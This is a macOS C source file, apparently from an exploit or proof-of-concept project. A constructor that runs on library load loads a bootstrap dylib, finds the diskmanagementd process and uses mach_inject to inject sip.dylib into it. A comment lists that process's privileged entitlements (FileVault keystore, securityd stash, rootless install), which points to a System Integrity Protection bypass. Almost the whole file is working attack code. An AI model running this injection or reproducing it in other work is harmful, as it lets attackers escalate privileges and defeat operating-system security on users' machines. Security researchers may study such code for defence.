#include "osinj/mach_inject.h"
#include "log.h"

#include <dlfcn.h>
#include <libproc.h>
#include <mach/mach.h>
#include <mach/mach_init.h>
#include <mach/thread_act.h>
#include <pthread.h>
#include <signal.h>
#include <stdlib.h>
#include <sys/proc_info.h>


pid_t pid_by_name(const char *name) {
    int count = proc_listpids(PROC_ALL_PIDS, 0, NULL, 0);
    pid_t pids[1024];
    memset(pids, 0, sizeof pids);
    proc_listpids(PROC_ALL_PIDS, 0, pids, sizeof pids);

    char path[PROC_PIDPATHINFO_MAXSIZE] = {0};
    for (int i = 0; i < count; i++) {
        pid_t pid = pids[i];
        if (!pid)
            continue;

        proc_pidpath(pids[i], path, sizeof path);
        int len = strlen(path);
        if (!len)
            continue;
        int pos = len;
        while (pos && path[pos] != '/')
            --pos;

        if (strcmp(path + pos + 1, name) == 0)
            return pid;
    }
    return 0;
}

__attribute__((constructor)) void run() {
    const char *cwd = getenv("DEVELOPER_DIR");
    if (!cwd) {
        LOG("please set DEVELOPER_DIR");
        goto end;
    }

    char dylib[PATH_MAX];
    snprintf(dylib, sizeof(dylib), "%s/bootstrap.dylib", cwd);
    void *module = dlopen(dylib, RTLD_NOW | RTLD_LOCAL);
    LOG("module: %p\n", module);
    if (!module) {
        LOG("dlopen error: %s\n", dlerror());
        goto end;
    }

    void *bootstrapfn = dlsym(module, "bootstrap");
    LOG("bootstrapfn: %p\n", bootstrapfn);
    if (!bootstrapfn) {
        LOG("could not locate bootstrap fn\n");
        goto end;
    }

    /*
    	<key>com.apple.keystore.filevault</key>
        <true/>
        <key>com.apple.private.securityd.stash</key>
        <true/>
        <key>com.apple.rootless.install</key>
    */
    pid_t pid = pid_by_name("diskmanagementd");
    LOG("pid: %d", pid);
    snprintf(dylib, sizeof(dylib), "%s/sip.dylib", cwd);
    mach_error_t err = mach_inject((mach_inject_entry)bootstrapfn, dylib,
                                   strlen(dylib) + 1, pid, 0);
    LOG("inject dylib returns %d", err);

end:
    if (module)
        dlclose(module);
}
